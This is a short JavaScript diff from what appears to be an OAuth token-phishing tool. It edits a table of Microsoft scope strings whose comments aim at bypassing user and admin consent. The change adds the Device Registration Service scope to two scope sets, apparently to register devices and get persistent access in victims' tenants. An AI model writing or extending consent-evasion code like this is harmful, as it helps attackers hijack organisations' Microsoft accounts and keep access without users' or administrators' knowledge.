@@ -41,13 +41,13 @@ const OPTIMIZED_SCOPES = {
   // Minimal scopes that typically bypass consent
   minimal: 'openid profile email offline_access',
   // Office-specific (pre-consented in most tenants)
-  office: 'openid profile email offline_access',
+  office: 'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default',
   // Graph-specific - use minimal to avoid admin consent
   graph: 'openid profile email offline_access',
   // Personal account optimized
   personal: 'openid profile email offline_access',
   // Full SSO (may trigger consent)
-  full: 'openid profile email offline_access'
+  full: 'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default',
 };
 
 /**
